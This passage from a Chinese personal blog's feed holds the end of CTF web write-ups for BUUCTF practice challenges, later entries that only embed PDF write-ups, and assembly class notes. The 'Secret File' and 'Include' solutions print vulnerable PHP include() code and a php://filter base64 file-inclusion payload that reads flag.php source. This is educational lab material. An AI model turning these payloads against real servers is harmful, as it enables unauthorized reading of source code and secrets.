class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret = <span class="string">'0a2781d2-6438-4103-8978-926c5e109fc8'</span></span><br><span class="line">md5.update(filename.encode(<span class="string">"utf8"</span>))</span><br><span class="line">file_md5 = md5.hexdigest()</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(cookie_secret + file_md5)</span><br><span class="line">filehash = md5.hexdigest()</span><br><span class="line"><span class="keyword">print</span> filehash</span><br></pre></td></tr></table></figure><p>得到 022b103d797804318dc8eb68133d1dcc<br><figure class="image-box">                <img src="./16.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>flag{c14f33f9-d55a-4416-8215-e0468fe7f9c0}</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p><a href="http://3c1b7c0b-3605-4ce5-b792-0b9ca36ddd7f.node3.buuoj.cn" target="_blank" rel="noopener">http://3c1b7c0b-3605-4ce5-b792-0b9ca36ddd7f.node3.buuoj.cn</a></p><p>查看源码,找到可疑页面</p><figure class="image-box">                <img src="./17.png" alt="图片" title class>                <p>图片</p>            </figure><p>继续看源码</p><figure class="image-box">                <img src="./18.png" alt="图片" title class>                <p>图片</p>            </figure><p>然后直接end了,提示回去看看</p><figure class="image-box">                <img src="./19.png" alt="图片" title class>                <p>图片</p>            </figure><p>Archive_room.php –&gt; end.php</p><p>抓个包看看,发现跳板是action.php</p><figure class="image-box">                <img src="./20.png" alt="图片" title class>                <p>图片</p>            </figure><p>访问secr3t.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="comment">//strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE,这个函数区分大小写,stristr()函数不区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>根据代码需要用到base64读取文件源码的伪协议,构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p><p>解base64得源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">"background-color:black;"</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">"font-family:verdana;color:red;text-align:center;"</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">"font-family:arial;color:red;font-size:20px;text-align:center;"</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"我就在这里"</span>;</span><br><span class="line">                $flag = <span class="string">'flag&#123;1c5044a3-10a5-4073-8bc3-a56134196d35&#125;'</span>;</span><br><span class="line">                $secret = <span class="string">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>flag{1c5044a3-10a5-4073-8bc3-a56134196d35}</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><a href="http://2fe69fec-e36f-470f-8434-0e32a3761d6b.node3.buuoj.cn" target="_blank" rel="noopener">http://2fe69fec-e36f-470f-8434-0e32a3761d6b.node3.buuoj.cn</a></p><p>根据网址 /?file=flag.php</p><p>想到文件包含,先伪协议读一波源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>解base64后<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can you find out the flag?"</span>;</span><br><span class="line"><span class="comment">//flag&#123;ba49b5dd-32ae-45f4-8fce-ea258e0807ca&#125;</span></span><br></pre></td></tr></table></figure></p><p>flag{ba49b5dd-32ae-45f4-8fce-ea258e0807ca}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HCTF-2018-WarmUp&quot;&gt;&lt;a href=&quot;#HCTF-2018-WarmUp&quot; class=&quot;headerlink&quot; title=&quot;[HCTF 2018]WarmUp&quot;&gt;&lt;/a&gt;[HCTF 2018]WarmUp&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;htt
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GINKGO大废物杯_wp</title>
    <link href="https://www.damyahome.github.io/ctf-writeup/ckwd913bn0025pwucat4cfqd3/GINKGO%E5%A4%A7%E5%BA%9F%E7%89%A9%E6%9D%AF-wp/"/>
    <id>https://www.damyahome.github.io/ctf-writeup/ckwd913bn0025pwucat4cfqd3/GINKGO%E5%A4%A7%E5%BA%9F%E7%89%A9%E6%9D%AF-wp/</id>
    <published>2020-09-23T13:06:12.000Z</published>
    <updated>2020-09-23T13:08:32.116Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="GINKGO大废物杯_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;GINKGO大废物杯_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Ginkgo废物杯_web1高地_复现</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-web/ckwd913bz002npwucn3o1ov6s/Ginkgo%E5%BA%9F%E7%89%A9%E6%9D%AF-web1%E9%AB%98%E5%9C%B0-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-web/ckwd913bz002npwucn3o1ov6s/Ginkgo%E5%BA%9F%E7%89%A9%E6%9D%AF-web1%E9%AB%98%E5%9C%B0-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-23T13:05:35.000Z</published>
    <updated>2020-09-23T13:07:38.989Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="Ginkgo废物杯_web1高地_复现.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;Ginkgo废物杯_web1高地_复现.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2020GACTF_misc复现</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-misc/ckwd913ab000hpwuc4uh63avk/2020GACTF-misc%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-misc/ckwd913ab000hpwuc4uh63avk/2020GACTF-misc%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-23T13:01:40.000Z</published>
    <updated>2020-09-23T13:05:03.856Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="2020GACTF_misc复现.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020GACTF_misc复现.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div
      
    
    </summary>
    
    
      <category term="ctf writeup misc" scheme="https://www.damyahome.github.io/categories/ctf-writeup-misc/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>FCTF_wp</title>
    <link href="https://www.damyahome.github.io/ctf-writeup/ckwd913bk0021pwucjo59d30z/FCTF-wp/"/>
    <id>https://www.damyahome.github.io/ctf-writeup/ckwd913bk0021pwucjo59d30z/FCTF-wp/</id>
    <published>2020-09-23T11:51:04.000Z</published>
    <updated>2020-09-23T11:52:08.815Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="FCTF_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;FCTF_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2020DozerCTF_wp_by_ginkgo_三叶草</title>
    <link href="https://www.damyahome.github.io/ctf-writeup/ckwd913ae000ipwuc600yub17/2020DozerCTF-wp-by-ginkgo-%E4%B8%89%E5%8F%B6%E8%8D%89/"/>
    <id>https://www.damyahome.github.io/ctf-writeup/ckwd913ae000ipwuc600yub17/2020DozerCTF-wp-by-ginkgo-%E4%B8%89%E5%8F%B6%E8%8D%89/</id>
    <published>2020-09-23T11:37:34.000Z</published>
    <updated>2020-09-23T11:39:58.357Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="2020_DozerCTF_wp_by_ginkgo_三叶草.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020_DozerCTF_wp_by_ginkgo_三叶草.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;applicatio
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="团队ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>第五周课堂笔记(汇编)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%94%E8%AE%B0/ckwd913eo0064pwucxknmks77/%E7%AC%AC%E4%BA%94%E5%91%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0-%E6%B1%87%E7%BC%96/"/>
    <id>https://www.damyahome.github.io/%E7%AC%94%E8%AE%B0/ckwd913eo0064pwucxknmks77/%E7%AC%AC%E4%BA%94%E5%91%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0-%E6%B1%87%E7%BC%96/</id>
    <published>2020-04-04T10:37:30.000Z</published>
    <updated>2020-04-04T10:38:18.152Z</updated>
    
    <content type="html"><![CDATA[<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>主要寄存器:(32位)<br>EAX EBX ECX EDX:数据寄存器<br>ESI EDI:变址寄存器<br>ESP:指向栈顶<br>EBP:指向栈底<br>EIP:指向指令执行的下一条地址</p><p>R(64位)</p><p>（以上也是在栈中的位置顺序）</p><h2 id="常见的汇编指令"><a href="#常见的汇编指令" class="headerlink" title="常见的汇编指令"></a>常见的汇编指令</h2><p>mov eax,0x12  将0x12覆盖的存入eax<br>mov eax,ebx   将ebxd的值覆盖的存入eax<br>add eax，ebx  将ebx+eax并覆盖的存入eax<br>inc eax       eax++<br>edc eax       eax–</p><h2 id="PUSH"><a href="#PUSH" class="headerlink" title="PUSH"></a>PUSH</h2><p>push指令将操作数压入内存的栈中<br>个人理解：栈结构不变，push数据（压栈）前，先将esp值减4，再将操作数内容压入esp指示的位置，再自行+4恢复到栈顶位置<br>push eax    将eax内容压栈<br>push [var]  将var指示的4直接内容压栈</p><h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>pop指令与push指令相反,执行出栈工作<br>个人理解：栈结构不变，pop数据（出栈）前，先将esp指示地址中的内容出栈，然后esp值+4恢复栈顶位置<br>pop edi    将edi内容出栈<br>pop [ebx]  将ebx指示的4直接内容出栈</p><h2 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h2><p>call指令实现子程序的调用<br>个人理解：call指令先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令，但依旧保存调用前的地址信息，当调用结束后返回到调用前的地址</p><h2 id="RET"><a href="#RET" class="headerlink" title="RET"></a>RET</h2><p>ret指令实现子程序的返回<br>个人理解：ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行，等待下一次返回数据</p><h2 id="调用约定画图理解"><a href="#调用约定画图理解" class="headerlink" title="调用约定画图理解"></a>调用约定画图理解</h2><figure class="image-box">                <img src="./pwn_pic.png" alt title class>                <p></p>            </figure><p>(以下纯个人理解,有不对的地方虚心听教)</p><p>main函数里定义A子程序,并赋值1,2,3,A子程序里返回a+b+c的值<br>old ebp是原栈底,一个保存原栈底地址的寄存器,内容可变结构不变<br>ret add返回由1,2,3赋值后的a+b+c,当有值被定义时就返回值,地址位置自行变化,功能不变<br>mov ebp,esp,有新内容进来,一个入栈过程,将ebp的地址转移到esp<br>leave,一个出栈过程,mov esp,ebp,将栈顶地址转移到栈底,pop出来一个ebp地址的内容,但因为已经将esp地址转移到ebp,所以pop ebp的内容依旧是在出栈,retn返回出栈的值</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;寄存器&quot;&gt;&lt;a href=&quot;#寄存器&quot; class=&quot;headerlink&quot; title=&quot;寄存器&quot;&gt;&lt;/a&gt;寄存器&lt;/h2&gt;&lt;p&gt;主要寄存器:(32位)&lt;br&gt;EAX EBX ECX EDX:数据寄存器&lt;br&gt;ESI EDI:变址寄存器&lt;br&gt;ESP:指向栈顶&lt;
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://www.damyahome.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="汇编" scheme="https://www.damyahome.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
</feed>
